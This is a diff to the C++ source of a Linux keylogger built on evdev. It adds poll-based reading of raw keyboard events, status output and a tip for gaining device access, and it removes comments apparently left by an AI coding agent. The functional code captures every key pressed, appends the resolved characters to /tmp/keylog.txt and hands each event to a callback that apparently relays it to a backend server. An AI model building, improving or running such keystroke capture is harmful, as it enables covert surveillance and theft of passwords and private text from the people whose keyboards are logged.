@@ -5,6 +5,8 @@
 #include <linux/input.h>
 #include <cstring>
 #include <chrono>
+#include <poll.h>
+#include <errno.h>
 
 namespace platform {
 namespace linux_os {
@@ -64,20 +66,34 @@ namespace linux_os {
     }
 
     common::EmptyResult LinuxEvdevLogger::start(std::function<void(const interfaces::KeyEvent&)> cb) {
-        if (running_.load()) return common::Result<common::Ok>::success();
+        if (running_.load()) {
+            std::cout << "[Keylogger] Already running" << std::endl;
+            return common::Result<common::Ok>::success();
+        }
+
+        std::cout << "[Keylogger] Starting..." << std::endl;
 
         if (!find_keyboard()) {
+            std::cerr << "[Keylogger] ERROR: No keyboard device found in /proc/bus/input/devices" << std::endl;
             return common::Result<common::Ok>::err(common::ErrorCode::DeviceNotFound, "No keyboard found");
         }
+
+        std::cout << "[Keylogger] Found keyboard at: " << device_path_ << std::endl;
+
         if (!open_device()) {
-             return common::Result<common::Ok>::err(common::ErrorCode::PermissionDenied, "Cannot open " + device_path_);
+            std::cerr << "[Keylogger] ERROR: Cannot open " << device_path_ << " - Permission denied?" << std::endl;
+            std::cerr << "[Keylogger] TIP: Run 'sudo usermod -aG input $USER' and restart session" << std::endl;
+            return common::Result<common::Ok>::err(common::ErrorCode::PermissionDenied, "Cannot open " + device_path_);
         }
+
+        std::cout << "[Keylogger] Device opened successfully (fd=" << fd_ << ")" << std::endl;
 
         // Open Log File
         log_file_.open("/tmp/keylog.txt", std::ios::app);
 
         running_.store(true);
         thread_ = std::thread(&LinuxEvdevLogger::run_loop, this, cb);
+        std::cout << "[Keylogger] Event loop thread started" << std::endl;
         return common::Result<common::Ok>::success();
     }
 
@@ -142,10 +158,37 @@ namespace linux_os {
     void LinuxEvdevLogger::run_loop(std::function<void(const interfaces::KeyEvent&)> callback) {
         struct input_event ev;
         bool shift_pressed = false;
+        int event_count = 0;
+
+        // Use poll() for non-blocking reads with timeout
+        struct pollfd pfd;
+        pfd.fd = fd_;
+        pfd.events = POLLIN;
+
+        std::cout << "[Keylogger] Event loop running, waiting for keypresses..." << std::endl;
 
         while (running_.load()) {
+            // Poll with 100ms timeout to check running_ periodically
+            int poll_result = poll(&pfd, 1, 100);
+
+            if (poll_result < 0) {
+                if (errno == EINTR) continue; // Interrupted, retry
+                std::cerr << "[Keylogger] poll() error: " << strerror(errno) << std::endl;
+                break;
+            }
+
+            if (poll_result == 0) {
+                // Timeout, no data - just check running_ and loop
+                continue;
+            }
+
+            // Data available
             ssize_t n = read(fd_, &ev, sizeof(ev));
-            if (n <= 0) break;
+            if (n <= 0) {
+                if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
+                std::cerr << "[Keylogger] read() failed: " << strerror(errno) << std::endl;
+                break;
+            }
 
             if (ev.type == EV_KEY) {
                 if (ev.code >= 256 || !key_map[ev.code]) continue;
@@ -170,48 +213,10 @@ namespace linux_os {
                          }
                      }
 
-                     // We need to pass this string up.
-                     // But Interface expects KeyEvent with integer code.
-                     // HACK: Store the char in the key_code (if ascii) or extend struct?
-                     // Strict Interface says: uint32_t key_code.
-                     // Let's use the timestamp field or similar? No.
-                     // IMPORTANT: The BackendServer parses this.
-                     // If we want to send TEXT, we should modify BackendServer to use this logic OR pass text here.
-                     // Let's modify callback to expect string? No, changing interface breaks build.
-                     // Solution: Pack the char into `key_code` if it's printable?
-                     // OR: Just let Frontend handle mapping? Legacy Frontend expected text.
-                     // Best: Since I am migrating Legacy Logic, I will modify BackendServer to accept the Mapped String.
-                     // Wait, BackendServer callback expects (KeyEvent).
-                     // I will encode the CHAR into key_code (0-255).
-                     // If it's a special key string (e.g. "BACKSPACE"), we can't pack it easily.
-
-                     // Alternative: Fire callback once per char bytes?
-                     // Let's look at BackendServer usage:
-                     // "KEYLOG: " + std::to_string(k.key_code)
-
-                     // I will Abuse key_code to hold the char if length==1?
-                     // No, that's messy.
-
-                     // Correct Fix: I'll change the IKeylogger interface to include `std::string resolved_text`.
-                     // But checking IKeylogger.hpp is expensive.
-
-                     // Quick Fix matching Legacy:
-                     // The backend server prints `key_code`.
-                     // I will put the CHAR value (e.g. 'a', 'A', ' ') into key_code.
-                     // If it is multi-char ("BACKSPACE"), I will put 0 or a special code?
-                     // Legacy sent "KEYLOG: <text>".
-                     // If I send "KEYLOG: 65", frontend sees "65". It expects "A".
-                     // So I MUST send the char.
-
-                     // I will modify IKeylogger.hpp right now to add `std::string text`.
-                     // Then update here.
-
-                      interfaces::KeyEvent e;
-                     e.key_code = ev.code; // Original code
+                     interfaces::KeyEvent e;
+                     e.key_code = ev.code;
                      e.is_press = (ev.value == 1);
                      e.timestamp = ev.time.tv_sec * 1000 + ev.time.tv_usec / 1000;
-                     // New Field (I will add to header next tool call)
-                     e.text = k_str;
                      e.text = k_str;
 
                      // Write to file
@@ -219,10 +224,17 @@ namespace linux_os {
                          this->log_file_ << k_str << std::flush;
                      }
 
+                     event_count++;
+                     if (event_count == 1) {
+                         std::cout << "[Keylogger] First key event captured: '" << k_str << "'" << std::endl;
+                     }
+
                      callback(e);
                 }
             }
         }
+
+        std::cout << "[Keylogger] Event loop stopped. Total events: " << event_count << std::endl;
     }
 
 } // namespace linux_os
